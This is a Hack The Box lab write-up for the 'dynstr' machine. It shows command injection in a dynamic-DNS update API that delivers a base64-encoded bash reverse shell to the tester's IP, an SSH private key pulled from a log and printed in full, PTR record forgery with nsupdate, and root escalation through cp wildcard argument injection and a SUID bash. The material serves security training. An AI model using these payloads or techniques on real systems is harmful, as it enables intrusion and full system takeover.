---
title: dynstr - Hack the Box Write-Up
published: true
image: /media/dynstr/dynstr.png
---
**Difficulty**: Medium. **OS**: Linux.

This machine was very cool to resolve. Has a lot of DNS stuff in the intrusion and some nice things on the privilege escalation.

Let's get into it.

### Intrusion

We start as always with recognize and enumeration phase. The IP address of the victim's machine is 10.10.10.244.

```
nmap -p --open -Pn --min-rate=5000 -v 10.10.10.244
```

```console
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-16 08:04 -03
Initiating SYN Stealth Scan at 08:04
Scanning dnsalias.htb (10.10.10.244) [65535 ports]
SYN Stealth Scan Timing: About 50.00% done; ETC: 08:08 (0:01:50 remaining)
Discovered open port 53/tcp on 10.10.10.244
Discovered open port 80/tcp on 10.10.10.244
Discovered open port 22/tcp on 10.10.10.244
Completed SYN Stealth Scan at 08:08, 222.90s elapsed (65535 total ports)
Nmap scan report for dnsalias.htb (10.10.10.244)
Host is up (0.72s latency).
Not shown: 52495 filtered tcp ports (no-response), 13037 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 223.01 seconds
           Raw packets sent: 124581 (5.482MB) | Rcvd: 13042 (521.700KB)
```

Ports 22,53 and 80 were found open, let's enumerate.

```
nmap -p22,53,80 -sCV -v 10.10.10.244
```

```console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)
|   256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)
|_  256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyna DNS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 08:17
Completed NSE at 08:17, 0.00s elapsed
Initiating NSE at 08:17
Completed NSE at 08:17, 0.00s elapsed
Initiating NSE at 08:17
Completed NSE at 08:17, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.38 seconds
```

Searching for footprints on the http server i've found some interesting things: Credentials, domains, an email and a relevant information.

**Footprints**

![](./media/dynstr/credentials.png)
![](./media/dynstr/domains.png)
![](./media/dynstr/email.png)
![](./media/dynstr/information.png)

I've added all domains found to **/etc/hosts** file. 

```console
# Host addresses
127.0.0.1  localhost
10.10.10.244    dnsalias.htb dynamicdns.htb no-ip.htb dyna.htb 
```

Ok, time to fuzzing.

```
wfuzz -c --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://dyna.htb/FUZZ
```

```console
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dyna.htb/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload        
=====================================================================

000000291:   301        9 L      28 W       305 Ch      "assets"       
000002995:   301        9 L      28 W       302 Ch      "nic"          

```

The direction `http://dyna.htb/nic` gives a blank page. Let's fuzz again.

```
wfuzz -c --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://dyna.htb/nic/FUZZ
```

```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dyna.htb/nic/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload        
=====================================================================

000000794:   200        1 L      1 W        8 Ch        "update"
```

Let's make a request to this direction.

```console
elpollon@elpollon:~/HTB/dynstr$ curl http://dyna.htb/nic/update

badauth
```

In a footprint is mentioned that the service runs with the same API of **no-ip.com** has. Doing some research I found how **no-ip.com** API works (Source: [https://www.noip.com/integrate/request](https://www.noip.com/integrate/request)).

It requires two parameters: **hostname** and **myip**. **hostname** has the following structure: `host1.example.com`. **myip** corresponds to our IP address.

Also, to authenticate with the API, a credentials are needed. These are attached in the headers of the request in **"Authorization"** field with the structure: **"Basic base64-auth-string**.

The **base-64-auth-string** corresponds to **username:password** in base64.

I've wrote a script in Python to check the response in function to these requirements. I've used the same credentials exposed in the web server.

```python
#!/usr/bin/python3

import requests
from base64 import b64encode

credentials_b64 = b64encode(b'dynadns:sndanyd').decode()
url = 'http://dyna.htb/nic/update'
headers = {'Authorization': 'Basic ' + credentials_b64}
params = {'hostname': 'xvideos.diamond-jackson.com', 'myip': '10.10.16.55'}

response = requests.get(url, headers=headers, params=params)
print(response.text)
```

Let's run this.

```console
elpollon@elpollon:~/HTB/dynstr/exploits$ chmod +x exploit.py
elpollon@elpollon:~/HTB/dynstr/exploits$ ./exploit.py

911 [wrngdom: diamond-jackson.com]
```

To interpret the responses check this [Article](https://www.noip.com/integrate/response). The *911* response corresponds to an internal server error.

Let's try with a different domain than **diamond-jackson.com**. Let's put any domain listed on the web server.

```python
#!/usr/bin/python3

import requests
from base64 import b64encode

credentials_b64 = b64encode(b'dynadns:sndanyd').decode()
url = 'http://dyna.htb/nic/update'
headers = {'Authorization': 'Basic ' + credentials_b64}
params = {'hostname': 'xvideos.dynamicdns.htb', 'myip': '10.10.16.55'}

response = requests.get(url, headers=headers, params=params)
print(response.text)
```

```console
elpollon@elpollon:~/HTB/dynstr/exploits$ ./exploit.py

good 10.10.16.55
```
This means that the update was successful. Let's try other thing than *xvideos*.

```python
#!/usr/bin/python3

import requests
from base64 import b64encode

credentials_b64 = b64encode(b'dynadns:sndanyd').decode()
url = 'http://dyna.htb/nic/update'
headers = {'Authorization': 'Basic ' + credentials_b64}
params = {'hostname': 'anything.dynamicdns.htb', 'myip': '10.10.16.55'}

response = requests.get(url, headers=headers, params=params)
print(response.text)
```

```console
elpollon@elpollon:~/HTB/dynstr/exploits$ ./exploit.py

good 10.10.16.55
```

Seems that the first field of the domain could be any value. Let's try to run `whoami` command.

```python
#!/usr/bin/python3

import requests
from base64 import b64encode

credentials_b64 = b64encode(b'dynadns:sndanyd').decode()
url = 'http://dyna.htb/nic/update'
headers = {'Authorization': 'Basic ' + credentials_b64}
params = {'hostname': '`whoami`.dynamicdns.htb', 'myip': '10.10.16.55'}

response = requests.get(url, headers=headers, params=params)
print(response.text)
```

```console
elpollon@elpollon:~/HTB/dynstr/exploits$ ./exploit.py

good 10.10.16.55
```

Looks like it works and this value could be vulnerable to RCE. Let's try now to get a reverse shell. We put on listen with **nc** in another terminal.

```
elpollon@elpollon:~/HTB/dynstr$ nc -nlvp 443

listening on [any] 443 ...
```

Now let's add a payload to the exploit to get the shell.

```python
#!/usr/bin/python3

import requests
from base64 import b64encode

payload = b'bash -i >& /dev/tcp/10.10.16.55/443 0>&1'
payload_b64 = b64encode(payload).decode()
credentials_b64 = b64encode(b'dynadns:sndanyd').decode()
url = 'http://dyna.htb/nic/update'
headers = {'Authorization': 'Basic ' + credentials_b64}
params = {'hostname': '`echo "{}" | base64 -d | bash`.dnsalias.htb'.format(payload_b64), 'myip': '10.10.16.55'}

response = requests.get(url, headers=headers, params=params)
print(response.text)
```

```console
elpollon@elpollon:~/HTB/dynstr/exploits$ ./exploit.py

```

At this point we get the reverse shell as **www-data** user in the other terminal.

```
elpollon@elpollon:~/HTB/dynstr$ nc -nlvp 443

listening on [any] 443 ...
connect to [10.10.16.55] from (UNKNOWN) [10.10.10.244] 60992
bash: cannot set terminal process group (795): Inappropriate ioctl for device
bash: no job control in this shell
www-data@dynstr:/var/www/html/nic$ 
```

Inside `/home` directory we see 2 users.

```console
www-data@dynstr:/$ cd home
www-data@dynstr:/home$ ls -l
total 8
drwxr-xr-x 5 bindmgr bindmgr 4096 Mar 15  2021 bindmgr
drwxr-xr-x 3 dyna    dyna    4096 Mar 18  2021 dyna
```
Nothing was found on dyna's home. In bindmgr's home was found interest things, including a **.ssh** folder.

```console
www-data@dynstr:/home/bindmgr/.ssh$ ls -l
total 16
-rw-r--r-- 1 bindmgr bindmgr  419 Mar 13  2021 authorized_keys
-rw------- 1 bindmgr bindmgr 1823 Mar 13  2021 id_rsa
-rw-r--r-- 1 bindmgr bindmgr  395 Mar 13  2021 id_rsa.pub
-rw-r--r-- 1 bindmgr bindmgr  444 Mar 13  2021 known_hosts
```

Let's check the **authorized_keys** file.

```console
www-data@dynstr:/home/bindmgr/.ssh$ cat authorized_keys
from="*.infra.dyna.htb" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
```

Even if we stole the **id_rsa** private key we cannot login via SSH because the SSH server only will authorize the connection if the client's IP is associated with **\*.infra.dyna.htb** domain ('\*' character means could be any value). Later on we will need to modify the DNS Pointer Record (PTR) with **nsupdate** in the victim's machine.

If you want to know more about DNS Pointer Records read [this](https://www.cloudflare.com/learning/dns/dns-records/dns-ptr-record/).

Ok, let's check's if there is more interesting things on bindmgr's home directory.

```console
www-data@dynstr:/home/bindmgr$ ls -l
total 8
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13  2021 support-case-C62796521
-r-------- 1 bindmgr bindmgr   33 Oct 17 07:10 user.txt
www-data@dynstr:/home/bindmgr$ cd support-case-C62796521/
www-data@dynstr:/home/bindmgr/support-case-C62796521$ ls -l
total 428
-rw-r--r-- 1 bindmgr bindmgr 237141 Mar 13  2021 C62796521-debugging.script
-rw-r--r-- 1 bindmgr bindmgr  29312 Mar 13  2021 C62796521-debugging.timing
-rw-r--r-- 1 bindmgr bindmgr   1175 Mar 13  2021 command-output-C62796521.txt
-rw-r--r-- 1 bindmgr bindmgr 163048 Mar 13  2021 strace-C62796521.txt
www-data@dynstr:/home/bindmgr/support-case-C62796521$ 
```

In the **strace-C62796521.txt** file is exposed an **id_rsa** private key.

```console
15123 read(5, "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n", 4096) = 1823
```

To apply **\n** characters I've copied the raw string to **id_rsa** file and processed it on my local machine.

```console
elpollon@elpollon:~/HTB/dynstr/content/ssh$ echo -e $(cat id_rsa) > id_rsa
elpollon@elpollon:~/HTB/dynstr/content/ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1
42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3
HjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F
L6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn
UOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX
CUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz
uSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a
XQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P
ZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk
+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs
4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq
xTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD
PswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k
obFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l
u291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS
TbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A
Tyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE
BNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv
C79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX
Wv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt
U96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ
b6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5
rlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG
jGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Let's try to login via SSH with this private key.

```console
elpollon@elpollon:~/HTB/dynstr$ ssh -i ./id_rsa bindmgr@10.10.10.244
bindmgr@10.10.10.244's password:
```

It requires a password. At this point should be 2 possibilities:

- The **id_rsa** is not useful.
- The **id_rsa** is useful but we need to modify DNS Pointer Records for **\*.infra.dyna.htb** to associate it with our IP address.

Let's play our cards to the second option. Let's take a look to **/etc/bind** in the victim's machine. 
```console
www-data@dynstr:/home/bindmgr$ ls -l /etc/bind
total 60
-rw-r--r-- 1 root root 1991 Feb 18  2021 bind.keys
-rw-r--r-- 1 root root  237 Dec 17  2019 db.0
-rw-r--r-- 1 root root  271 Dec 17  2019 db.127
-rw-r--r-- 1 root root  237 Dec 17  2019 db.255
-rw-r--r-- 1 root root  353 Dec 17  2019 db.empty
-rw-r--r-- 1 root root  270 Dec 17  2019 db.local
-rw-r--r-- 1 root bind  100 Mar 15  2021 ddns.key
-rw-r--r-- 1 root bind  101 Mar 15  2021 infra.key
drwxr-sr-x 2 root bind 4096 Mar 15  2021 named.bindmgr
-rw-r--r-- 1 root bind  463 Dec 17  2019 named.conf
-rw-r--r-- 1 root bind  498 Dec 17  2019 named.conf.default-zones
-rw-r--r-- 1 root bind  969 Mar 15  2021 named.conf.local
-rw-r--r-- 1 root bind  895 Mar 15  2021 named.conf.options
-rw-r----- 1 bind bind  100 Mar 15  2021 rndc.key
-rw-r--r-- 1 root root 1317 Dec 17  2019 zones.rfc1918
```

We will need **infra.key** to modify the PTR of **\*.infra.dyna.htb**. We use **nsupdate** command.

```console
www-data@dynstr:/home/bindmgr$ nsupdate -k /etc/bind/infra.key 
> update add diamondjackson.infra.dyna.htb 300 A 10.10.16.55 
> 
> update add 55.16.10.10.in-addr.arpa. 300 PTR diamondjackson.infra.dyna.htb
> send
> quit
```

Note that in the second update the IP address is written in reverse order (e.g 10.10.16.244 -> 244.16.10.10).

Let's see if we can login via SSH now.

```console
elpollon@elpollon:~/HTB/dynstr$ ssh -i ./id_rsa bindmgr@10.10.10.244
Last login: Sun Oct 17 10:09:38 2021 from r.infra.dyna.htb
bindmgr@dynstr:~$
```

Intrusion done. Now we see user's flag.

```console
bindmgr@dynstr:~$ ls -l
total 8
drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13  2021 support-case-C62796521
-r-------- 1 bindmgr bindmgr   33 Oct 17 07:10 user.txt
bindmgr@dynstr:~$ cat user.txt
70e2ee5a520e104a5c98836bb4edee0d
bindmgr@dynstr:~$ 
```

### Privilege escalation

Let's see if we can execute binaries as sudo.

```console
bindmgr@dynstr:~$ sudo -l
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
Matching Defaults entries for bindmgr on dynstr:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bindmgr may run the following commands on dynstr:
    (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh
```

User **bindmgr** can execute the /usr/local/bin/bindmgr.sh file as sudo with no password. Let's see the output of the execution as sudo.

```console
bindmgr@dynstr:~$ sudo /usr/local/bin/bindmgr.sh
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /home/bindmgr.
[-] ERROR: Check versioning. Exiting.
```

Let's take a look to the **/usr/local/bindmgr.sh** script.

```bash
#!/usr/bin/bash

# This script generates named.conf.bindmgr to workaround the problem
# that bind/named can only include single files but no directories.
#
# It creates a named.conf.bindmgr file in /etc/bind that can be included
# from named.conf.local (or others) and will include all files from the
# directory /etc/bin/named.bindmgr.
#
# NOTE: The script is work in progress. For now bind is not including
#       named.conf.bindmgr. 
#
# TODO: Currently the script is only adding files to the directory but
#       not deleting them. As we generate the list of files to be included
#       from the source directory they won't be included anyway.

BINDMGR_CONF=/etc/bind/named.conf.bindmgr
BINDMGR_DIR=/etc/bind/named.bindmgr

indent() { sed 's/^/    /'; }

# Check versioning (.version)
echo "[+] Running $0 to stage new configuration from $PWD."
if [[ ! -f .version ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 42
fi
if [[ "`cat .version 2>/dev/null`" -le "`cat $BINDMGR_DIR/.version 2>/dev/null`" ]] ; then
    echo "[-] ERROR: Check versioning. Exiting."
    exit 43
fi

# Create config file that includes all files from named.bindmgr.
echo "[+] Creating $BINDMGR_CONF file."
printf '// Automatically generated file. Do not modify manually.\n' > $BINDMGR_CONF
for file in * ; do
    printf 'include "/etc/bind/named.bindmgr/%s";\n' "$file" >> $BINDMGR_CONF
done

# Stage new version of configuration files.
echo "[+] Staging files to $BINDMGR_DIR."
cp .version * /etc/bind/named.bindmgr/

# Check generated configuration with named-checkconf.
echo "[+] Checking staged configuration."
named-checkconf $BINDMGR_CONF >/dev/null
if [[ $? -ne 0 ]] ; then
    echo "[-] ERROR: The generated configuration is not valid. Please fix following errors: "
    named-checkconf $BINDMGR_CONF 2>&1 | indent
    exit 44
else 
    echo "[+] Configuration successfully staged."
    # *** TODO *** Uncomment restart once we are live.
    # systemctl restart bind9
    if [[ $? -ne 0 ]] ; then
        echo "[-] Restart of bind9 via systemctl failed. Please check logfile: "
	systemctl status bind9
    else
	echo "[+] Restart of bind9 via systemctl succeeded."
    fi
fi
```

In the first conditional, the script checks if **.version** file doesn't exists in the current folder. The second conditional is **False** only if **.version** is a number greater than 0. The **.version** file has been created in order to make these conditionals **False**.

```console
bindmgr@dynstr:/tmp/pwn$ echo "1" > .version
bindmgr@dynstr:/tmp/pwn$ sudo /usr/local/bin/bindmgr.sh
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp/pwn.
[+] Creating /etc/bind/named.conf.bindmgr file.
[+] Staging files to /etc/bind/named.bindmgr.
cp: cannot stat '*': No such file or directory
[+] Checking staged configuration.
[-] ERROR: The generated configuration is not valid. Please fix following errors: 
    /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/*: file not found
```

After by passing the first two conditionals the script copies all files in the current folder to /etc/bind/named.bindmgr with `cp .version * /etc/bind/named.bindmgr/` command. We can take advantage by copying a bash binary with SUID permissions.

```console
bindmgr@dynstr:/tmp/pwn$ cp /bin/bash .
bindmgr@dynstr:/tmp/pwn$ chmod +s /bin/bash
bindmgr@dynstr:/tmp/pwn$ ls -la
total 1168
drwxrwxr-x  2 bindmgr bindmgr    4096 Oct 17 17:21 .
drwxrwxrwt 13 root    root       4096 Oct 17 17:09 ..
-rw-rw-r--  1 bindmgr bindmgr       2 Oct 17 17:11 .version
-rwsr-sr-x  1 bindmgr bindmgr 1183448 Oct 17 17:21 bash
```

To mantain all privileges of the files during the copying, the command should be `cp .version * --preserve=mode /etc/bind/named.bindmgr`. If we create an empty file called **--preserve=mode** the command will interpret this as a parameter, not as a file (will be included in '\*'). Let's create this empty file and run the script as sudo.

```console
bindmgr@dynstr:/tmp/pwn$ echo > --preserve=mode
bindmgr@dynstr:/tmp/pwn$ sudo /usr/local/bin/bindmgr.sh
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
[+] Running /usr/local/bin/bindmgr.sh to stage new configuration from /tmp/pwn.
[+] Creating /etc/bind/named.conf.bindmgr file.
[+] Staging files to /etc/bind/named.bindmgr.
[+] Checking staged configuration.
[-] ERROR: The generated configuration is not valid. Please fix following errors: 
    /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/--preserve=mode: file not found
```

At this point the **bash** binary should been copied to `/etc/bind/named.bindmgr` with SUID permission. Let's check if this is true.

```console
bindmgr@dynstr:/etc/bind/named.bindmgr$ ls -l
total 1156
-rwsr-sr-x 1 root bind 1183448 Oct 17 17:32 bash
```

Let's execute this binary with SUID permission activated.

```
bindmgr@dynstr:/etc/bind/named.bindmgr$ ./bash -p
bash-5.0# whoami
root
bash-5.0# 
```

Machine rooted. Let's see the root flag.

```console
bash-5.0# cd /root
bash-5.0# ls -l
total 8
drwxr-xr-x 4 root root 4096 Mar 14  2021 cleanup
-r-------- 1 root root   33 Oct 17 07:10 root.txt
bash-5.0# cat root.txt
9a3a7fa9675fb4b5a2196768a042e842
bash-5.0# 
```

### Conclusion

This machine gets really deep in DNS aspects, I really liked it. Also, the intrusion was not just copying the private key to login via SSH, also was needed to modify DNS pointer records to login succesfully. I liked also the privilege escalation stage as well in order to practice bash scripting and get new methods to exploit commands.
